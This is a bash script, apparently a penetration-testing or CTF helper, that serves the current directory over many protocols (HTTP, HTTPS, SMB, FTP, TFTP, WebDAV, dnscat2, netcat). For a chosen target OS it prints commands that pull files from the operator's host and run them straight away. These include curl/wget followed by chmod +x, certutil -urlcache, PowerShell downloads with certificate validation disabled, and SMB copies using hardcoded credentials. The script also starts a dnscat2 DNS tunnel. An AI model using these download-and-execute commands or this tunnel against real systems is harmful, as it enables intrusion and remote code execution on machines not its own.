#!/usr/bin/env bash
# serve_local.sh
# Serve current directory with multiple protocols (HTTP, HTTPS, SMB, FTP, TFTP, WebDAV, DNS).
# Prints download commands for each selected file.
set -euo pipefail

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

PORT=80
HTTPS_PORT=443
WEBDAV_PORT=8080
FTP_PORT=21
NC_PORT=9001
INTERFACE=""
VSFTPD_CONF=""

# Parse arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    -i|--interface)
      INTERFACE="$2"
      shift 2
      ;;
    -p|--port)
      PORT="$2"
      shift 2
      ;;
    *)
      echo -e "\n${RED}🚨 ERROR: Unknown argument: $1${NC}\n"
      exit 1
      ;;
  esac
done

# Get IP address
get_ip() {
  local iface=$1
  ip -4 addr show "$iface" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}

echo

if [[ -n "$INTERFACE" ]]; then
  LOCAL_IP="$(get_ip "$INTERFACE")"
  if [[ -z "$LOCAL_IP" ]]; then
    echo -e "${RED}🚨 ERROR: No IPv4 address found on interface '$INTERFACE'.${NC}\n"
    exit 1
  fi
else
  echo -e "${YELLOW}🌐 Please select an interface:${NC}"
  # List all interfaces with IPv4 addresses, excluding lo
  mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2}' | grep -v 'lo' | sort -u)
  
  if [[ ${#IFACES[@]} -eq 0 ]]; then
    echo -e "${RED}🚨 ERROR: No active network interfaces with IPv4 addresses found.${NC}\n"
    exit 1
  fi

  for i in "${!IFACES[@]}"; do
    echo -e "  [${CYAN}$((i+1))${NC}] ${BOLD}${IFACES[$i]}${NC} ($(get_ip "${IFACES[$i]}"))"
  done
  echo

  while true; do
    echo -ne "${YELLOW}👉 Enter number to select interface: ${NC}"
    read iface_idx
    if [[ "$iface_idx" =~ ^[0-9]+$ ]] && (( iface_idx >= 1 && iface_idx <= ${#IFACES[@]} )); then
      INTERFACE="${IFACES[$((iface_idx-1))]}"
      LOCAL_IP="$(get_ip "$INTERFACE")"
      break
    fi
    echo -e "${RED}❌ Invalid selection. Try again.${NC}"
  done
fi

echo -e "\n✅ Using interface ${GREEN}$INTERFACE${NC} with IP: ${GREEN}$LOCAL_IP${NC}\n"

# Collect regular files (non-recursive) in current directory
mapfile -t FILES < <(find . -maxdepth 1 -type f -print0 | xargs -0 -n1 -I{} basename "{}" 2>/dev/null || true)

if [[ ${#FILES[@]} -eq 0 ]]; then
  echo -e "${YELLOW}⚠️ No regular files found in $(pwd).${NC}\n"
else
  echo -e "${BLUE}📁 Files in $(pwd):${NC}"
  i=1
  for f in "${FILES[@]}"; do
    echo -e "  [${CYAN}$i${NC}] $f"
    ((i++))
  done
  echo
fi

# Selection logic
SELECTED_FILES=()
if [[ ${#FILES[@]} -gt 0 ]]; then
  while true; do
    echo -ne "${YELLOW}👉 Enter number(s) to select files (e.g., 1 2 5 or 'all'): ${NC}"
    read selection
    if [[ "$selection" == "all" ]]; then
      SELECTED_FILES=("${FILES[@]}")
      echo -e "${GREEN}✅ Selected all files.${NC}"
      break
    fi
    # Split by spaces or commas
    IFS=', ' read -ra ADDR <<< "$selection"
    TEMP_SELECTED=()
    VALID=true
    for i in "${ADDR[@]}"; do
      if [[ "$i" =~ ^[0-9]+$ ]] && (( i >= 1 && i <= ${#FILES[@]} )); then
        # Check if already selected to avoid duplicates
        DUPE=false
        for s in "${TEMP_SELECTED[@]}"; do
          if [[ "$s" == "${FILES[$((i-1))]}" ]]; then
            DUPE=true
            break
          fi
        done
        if [[ "$DUPE" == "false" ]]; then
          TEMP_SELECTED+=("${FILES[$((i-1))]}")
        fi
      else
        echo -e "${RED}❌ Invalid selection: $i${NC}"
        VALID=false
        break
      fi
    done
    if [[ "$VALID" == "true" ]] && [[ ${#TEMP_SELECTED[@]} -gt 0 ]]; then
      SELECTED_FILES=("${TEMP_SELECTED[@]}")
      echo -e "${GREEN}✅ Selected: ${SELECTED_FILES[*]}${NC}"
      break
    fi
    echo -e "${RED}❌ Please enter a valid list of numbers between 1 and ${#FILES[@]}.${NC}"
  done
  echo
fi

# OS Selection logic
TARGET_OS=""
while true; do
  echo -e "${BLUE}⚙️ Target OS:${NC}"
  echo -e "  [${CYAN}1${NC}] Linux"
  echo -e "  [${CYAN}2${NC}] Windows"
  echo -ne "${YELLOW}👉 Enter number to select OS: ${NC}"
  read os_selection
  case "$os_selection" in
    1) TARGET_OS="Linux"; break ;;
    2) TARGET_OS="Windows"; break ;;
    *) echo -e "${RED}❌ Invalid selection. Please enter 1 or 2.${NC}" ;;
  esac
done
echo -e "${GREEN}✅ Selected OS: $TARGET_OS${NC}\n"

# Protocol Selection logic
PROTOCOL=""
while true; do
  echo -e "${BLUE}🔌 Select Protocol:${NC}"
  echo -e "  [${CYAN}1${NC}] HTTP only"
  echo -e "  [${CYAN}2${NC}] HTTPS only (requires goshs)"
  echo -e "  [${CYAN}3${NC}] SMB only"
  echo -e "  [${CYAN}4${NC}] FTP only"
  echo -e "  [${CYAN}5${NC}] TFTP only"
  echo -e "  [${CYAN}6${NC}] WebDAV only"
  echo -e "  [${CYAN}7${NC}] DNS (dnscat2) only"
  echo -e "  [${CYAN}8${NC}] Netcat (nc) only"
  echo -e "  [${CYAN}9${NC}] SCP only"
  echo -e "  [${CYAN}10${NC}] ${BOLD}ALL Protocols${NC} (HTTP, HTTPS, SMB, FTP, TFTP, WebDAV, DNS, NC, SCP)"
  echo -ne "${YELLOW}👉 Enter number to select protocol: ${NC}"
  read proto_selection
  case "$proto_selection" in
    1) PROTOCOL="HTTP"; break ;;
    2) PROTOCOL="HTTPS"; break ;;
    3) PROTOCOL="SMB"; break ;;
    4) PROTOCOL="FTP"; break ;;
    5) PROTOCOL="TFTP"; break ;;
    6) PROTOCOL="WebDAV"; break ;;
    7) PROTOCOL="DNS"; break ;;
    8) PROTOCOL="NC"; break ;;
    9) PROTOCOL="SCP"; break ;;
    10) PROTOCOL="ALL"; break ;;
    *) echo -e "${RED}❌ Invalid selection. Please enter 1-10.${NC}" ;;
  esac
done
echo -e "${GREEN}✅ Selected Protocol: $PROTOCOL${NC}\n"

# Prompt for SCP username if needed
SCP_USER="$USER"
if [[ "$PROTOCOL" == "SCP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  echo -ne "${YELLOW}👉 Enter username for SCP (default: $USER): ${NC}"
  read input_user
  if [[ -n "$input_user" ]]; then
    SCP_USER="$input_user"
  fi
  echo -e "${GREEN}✅ Using SCP username: $SCP_USER${NC}\n"
fi

# Port and privilege checks
if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  if [[ "$PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ WARNING: Port $PORT is privileged and you are not root.${NC}"
    PORT=8000
    echo -e "Falling back to port ${GREEN}$PORT${NC} for HTTP."
  fi
fi

if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  if [[ "$HTTPS_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ WARNING: Port $HTTPS_PORT is privileged and you are not root.${NC}"
    HTTPS_PORT=8443
    echo -e "Falling back to port ${GREEN}$HTTPS_PORT${NC} for HTTPS."
  fi
fi

if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  if [[ "$FTP_PORT" -eq 21 ]] && [[ "$EUID" -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ WARNING: Port $FTP_PORT is privileged and you are not root.${NC}"
    FTP_PORT=2121
    echo -e "Falling back to port ${GREEN}$FTP_PORT${NC} for FTP."
  fi
fi

if [[ "$PROTOCOL" == "NC" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
  if [[ "$NC_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ WARNING: Port $NC_PORT is privileged and you are not root.${NC}"
    NC_PORT=9001
    echo -e "Falling back to port ${GREEN}$NC_PORT${NC} for Netcat."
  fi
fi

if [[ "$PROTOCOL" != "HTTP" && "$PROTOCOL" != "HTTPS" && "$PROTOCOL" != "FTP" && "$PROTOCOL" != "WebDAV" ]] && [[ "$EUID" -ne 0 ]]; then
  echo -e "${YELLOW}⚠️ WARNING: SMB (445), TFTP (69), and DNS (53) usually require root privileges.${NC}"
fi

# Print download commands per file
echo
echo -e "${BOLD}${BLUE}📦 ========== Download commands (per file) ==========${NC}"
if [[ ${#SELECTED_FILES[@]} -eq 0 ]]; then
  echo -e "${YELLOW}⚠️ No files to print commands for.${NC}\n"
else
  for f in "${SELECTED_FILES[@]}"; do
    url_encoded="${f//%/%25}"
    url_encoded="${url_encoded//#/%23}"
    url_encoded="${url_encoded// /%20}"
    echo
    echo -e "📄 File: ${BOLD}${CYAN}$f${NC}"
    
    if [[ "$TARGET_OS" == "Linux" ]]; then
      if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (HTTP):${NC}"
        echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
        echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (HTTPS - insecure):${NC}"
        echo "    curl -k -fsSL \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
        echo "    wget --no-check-certificate -q --show-progress -O \"$f\" \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (SMB):${NC}"
        echo "    smbclient \"//$LOCAL_IP/share\" -c \"get $f\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (FTP):${NC}"
        echo "    curl -u anonymous: \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
        echo "    wget \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -O \"$f\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (TFTP):${NC}"
        echo "    tftp $LOCAL_IP -c get \"$f\" && chmod +x \"$f\" && ./\"$f\""
      fi
      if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (WebDAV):${NC}"
        echo "    curl -s \"http://$LOCAL_IP:$WEBDAV_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
        echo "    cadaver http://$LOCAL_IP:$WEBDAV_PORT/"
      fi
      if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Linux (DNS/dnscat2):${NC}"
        echo "    dnscat2 --dns server=$LOCAL_IP,port=53"
        echo "    (In session: download \"$f\")"
      fi
      if [[ "$PROTOCOL" == "NC" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Netcat (nc):${NC}"
        echo -e "    ${YELLOW}Local (Sender):${NC} nc -lnvp $NC_PORT -q 1 < \"$f\""
        echo -e "    ${YELLOW}Target (Receiver):${NC} nc $LOCAL_IP $NC_PORT > \"$f\""
      fi
      if [[ "$PROTOCOL" == "SCP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}SCP (Secure Copy):${NC}"
        echo "    scp $SCP_USER@$LOCAL_IP:\"$(pwd)/$f\" ."
      fi
    elif [[ "$TARGET_OS" == "Windows" ]]; then
      if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (HTTP):${NC}"
        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\" && .\\\"$f\""
        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'; .\\'$f'\""
      fi
      if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (HTTPS - insecure):${NC}"
        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
        # We use single quotes for echo to prevent bash expansion of $true, and double quotes for PowerShell -Command
        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f'); .\\'$f'\""
        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'; .\\'$f'\""
      fi
      if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (SMB):${NC}"
        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\$LOCAL_IP\\share\\$f . && .\\$f\""
      fi
      if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (FTP):${NC}"
        echo "    curl.exe \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP:$FTP_PORT/$url_encoded', '$f'); .\\'$f'\""
      fi
      if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (TFTP):${NC}"
        echo "    tftp -i $LOCAL_IP GET \"$f\" && .\\\"$f\""
      fi
      if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (WebDAV):${NC}"
        echo "    (If service error: net start webclient)"
        echo "    cmd.exe /c \"copy \\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f . && .\\$f\""
        echo "    net use Z: \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\""
      fi
      if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Windows (DNS/dnscat2):${NC}"
        echo "    dnscat2.exe --dns server=$LOCAL_IP,port=53"
        echo "    (In session: download \"$f\")"
      fi
      if [[ "$PROTOCOL" == "NC" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}Netcat (nc):${NC}"
        echo -e "    ${YELLOW}Local (Sender):${NC} nc -lnvp $NC_PORT -q 1 < \"$f\""
        echo -e "    ${YELLOW}Target (Receiver):${NC} nc.exe $LOCAL_IP $NC_PORT > \"$f\""
      fi
      if [[ "$PROTOCOL" == "SCP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
        echo -e "  ${BLUE}SCP (Secure Copy):${NC}"
        echo "    scp.exe $SCP_USER@$LOCAL_IP:\"$(pwd)/$f\" ."
      fi
    fi
  done
fi

echo
echo -e "${BOLD}${GREEN}🚀 ==============================================${NC}"
echo -e "${BOLD}${GREEN}🚀 Starting server(s)...${NC}"
echo

cleanup() {
  echo -e "\n${YELLOW}🧹 Cleaning up...${NC}"
  # Kill the entire process group started by this script
  # This ensures all background servers and their children are killed
  trap - EXIT # Avoid infinite loops
  kill -TERM -$$ 2>/dev/null || true
  sleep 0.5
  kill -KILL -$$ 2>/dev/null || true
  
  [[ -n "$VSFTPD_CONF" && -f "$VSFTPD_CONF" ]] && rm -f "$VSFTPD_CONF"
}
trap cleanup EXIT

start_http() {
  if command -v goshs >/dev/null 2>&1; then
    echo -e "🟢 Starting ${CYAN}goshs${NC} HTTP server on port ${GREEN}$PORT${NC}"
    goshs -p "$PORT"
  elif command -v python3 >/dev/null 2>&1; then
    echo -e "${YELLOW}⚠️ WARNING: 'goshs' not found. Falling back to 'python3 -m http.server'.${NC}"
    echo -e "🟢 Starting ${CYAN}python3${NC} server on port ${GREEN}$PORT${NC}"
    python3 -m http.server "$PORT"
  else
    echo -e "${RED}🚨 ERROR: Neither 'goshs' nor 'python3' was found in PATH.${NC}"
    return 1
  fi
}

start_https() {
  if command -v goshs >/dev/null 2>&1; then
    echo -e "🟢 Starting ${CYAN}goshs${NC} HTTPS server on port ${GREEN}$HTTPS_PORT${NC} (self-signed)"
    goshs -s -ss -p "$HTTPS_PORT"
  else
    echo -e "${RED}🚨 ERROR: 'goshs' is required for HTTPS. (go install github.com/patrickhener/goshs@latest)${NC}"
    return 1
  fi
}

start_smb() {
  local smb_cmd=""
  if command -v smbserver.py >/dev/null 2>&1 && smbserver.py -h >/dev/null 2>&1; then
    smb_cmd="smbserver.py"
  elif command -v impacket-smbserver >/dev/null 2>&1 && impacket-smbserver -h >/dev/null 2>&1; then
    smb_cmd="impacket-smbserver"
  elif [[ -f "/usr/share/doc/python3-impacket/examples/smbserver.py" ]] && /usr/bin/python3 -c "import impacket" >/dev/null 2>&1; then
    smb_cmd="/usr/bin/python3 /usr/share/doc/python3-impacket/examples/smbserver.py"
  fi

  if [[ -n "$smb_cmd" ]]; then
    echo -e "🟢 Starting ${CYAN}SMB server${NC} ($smb_cmd) (share: ${GREEN}share${NC}, user: ${GREEN}smbuser${NC}, pass: ${GREEN}smbpass${NC})"
    $smb_cmd share "$(pwd)" -smb2support -username smbuser -password smbpass
  else
    echo -e "${RED}🚨 ERROR: 'impacket-smbserver' or 'smbserver.py' not found or not working. (pip install impacket)${NC}"
    return 1
  fi
}

start_ftp() {
  if python3 -m pyftpdlib --help >/dev/null 2>&1; then
    echo -e "🟢 Starting ${CYAN}python3 pyftpdlib${NC} on port ${GREEN}$FTP_PORT${NC} (anonymous root: $(pwd))"
    python3 -m pyftpdlib -p "$FTP_PORT" -d "$(pwd)" -u anonymous -P ""
  elif command -v vsftpd >/dev/null 2>&1; then
    VSFTPD_CONF="/tmp/vsftpd.conf.$$"
    echo "listen=YES
listen_port=$FTP_PORT
listen_ipv6=NO
anonymous_enable=YES
anon_root=$(pwd)
no_anon_password=YES
write_enable=NO
pasv_enable=YES
background=NO
seccomp_sandbox=NO" > "$VSFTPD_CONF"
    echo -e "🟢 Starting ${CYAN}vsftpd${NC} on port ${GREEN}$FTP_PORT${NC} (anonymous root: $(pwd))"
    if [[ "$EUID" -ne 0 ]]; then
      echo -e "${YELLOW}⚠️ WARNING: vsftpd might fail if not run as root, even on high ports.${NC}"
    fi
    vsftpd "$VSFTPD_CONF"
  else
    echo -e "${RED}🚨 ERROR: Neither 'pyftpdlib' nor 'vsftpd' was found. (pip install pyftpdlib OR apt install vsftpd)${NC}"
    return 1
  fi
}

start_tftp() {
  if command -v atftpd >/dev/null 2>&1; then
    echo -e "🟢 Starting ${CYAN}atftpd${NC} on port ${GREEN}69${NC} (foreground, path: $(pwd))"
    atftpd --daemon --port 69 --no-fork "$(pwd)"
  else
    echo -e "${RED}🚨 ERROR: 'atftpd' not found. (apt install atftpd)${NC}"
    return 1
  fi
}

start_webdav() {
  if command -v rclone >/dev/null 2>&1; then
    echo -e "🟢 Starting ${CYAN}rclone WebDAV${NC} on port ${GREEN}$WEBDAV_PORT${NC}"
    rclone serve webdav "$(pwd)" --addr ":$WEBDAV_PORT"
  else
    echo -e "${RED}🚨 ERROR: 'rclone' not found. (apt install rclone)${NC}"
    return 1
  fi
}

start_dns() {
  if command -v dnscat2 >/dev/null 2>&1; then
    echo -e "🟢 Starting ${CYAN}dnscat2 DNS server${NC} on port ${GREEN}53${NC}"
    dnscat2 --dns server=$LOCAL_IP,port=53 --no-cache
  else
    echo -e "${RED}🚨 ERROR: 'dnscat2' not found. (apt install dnscat2)${NC}"
    return 1
  fi
}

start_nc() {
  if ! command -v nc >/dev/null 2>&1; then
    echo -e "${RED}🚨 ERROR: 'nc' (netcat) not found in PATH.${NC}"
    return 1
  fi
  for f in "${SELECTED_FILES[@]}"; do
    echo -e "🟢 Starting ${CYAN}Netcat (nc)${NC} to send ${BOLD}$f${NC} on port ${GREEN}$NC_PORT${NC}"
    echo -e "${YELLOW}ℹ️  Waiting for connection on port $NC_PORT... (Ctrl+C to skip/exit)${NC}"
    # Use -q 1 to quit 1 second after EOF (works for traditional nc)
    # If using openbsd nc, user might need -N instead, but -q 1 is a good default for CTFs
    nc -lnvp "$NC_PORT" -q 1 < "$f" || true
    echo -e "${GREEN}✅ Finished sending $f (or connection closed).${NC}"
  done
}

start_scp() {
  echo -e "ℹ️  ${CYAN}SCP${NC} is a client-side tool and doesn't require a dedicated server in this script."
  echo -e "🔑 Ensure your ${BOLD}SSH service${NC} is running locally: ${YELLOW}sudo systemctl start ssh${NC}"
  echo -e "🚀 Commands have been printed above. Use them on the target machine."
  # Keep the script running to prevent immediate exit if only SCP is selected
  echo -e "\n${BLUE}Press Ctrl+C to exit when finished.${NC}"
  while true; do sleep 1; done
}

# Pre-check: try to free up ports if fuser is available
if command -v fuser >/dev/null 2>&1; then
  echo -e "${BLUE}🛠️  Checking and cleaning target ports...${NC}"
  case "$PROTOCOL" in
    HTTP) fuser -k "$PORT/tcp" 2>/dev/null || true ;;
    HTTPS) fuser -k "$HTTPS_PORT/tcp" 2>/dev/null || true ;;
    SMB)  fuser -k 445/tcp 2>/dev/null || true ;;
    FTP)  fuser -k "$FTP_PORT/tcp" 2>/dev/null || true ;;
    TFTP) fuser -k 69/udp 2>/dev/null || true ;;
    WebDAV) fuser -k "$WEBDAV_PORT/tcp" 2>/dev/null || true ;;
    DNS)  fuser -k 53/udp 53/tcp 2>/dev/null || true ;;
    NC)   fuser -k "$NC_PORT/tcp" 2>/dev/null || true ;;
    ALL)
      fuser -k "$PORT/tcp" "$HTTPS_PORT/tcp" 445/tcp "$FTP_PORT/tcp" 69/udp "$WEBDAV_PORT/tcp" 53/udp 53/tcp "$NC_PORT/tcp" 2>/dev/null || true
      ;;
  esac
  sleep 0.5 # Give the OS a moment to release the sockets
fi

case "$PROTOCOL" in
  HTTP)   start_http ;;
  HTTPS)  start_https ;;
  SMB)    start_smb ;;
  FTP)    start_ftp ;;
  TFTP)   start_tftp ;;
  WebDAV) start_webdav ;;
  DNS)    start_dns ;;
  NC)     start_nc ;;
  SCP)    start_scp ;;
  ALL)
    echo -e "${BLUE}🌐 Attempting to start all servers...${NC}"
    (start_http || true) &
    (start_https || true) &
    (start_smb || true) &
    (start_ftp || true) &
    (start_tftp || true) &
    (start_webdav || true) &
    (start_nc || true) &
    start_dns || { echo -e "${YELLOW}⚠️ WARNING: Foreground DNS server (dnscat2) could not start or was exited. Waiting for background servers...${NC}"; wait; }
    ;;
esac
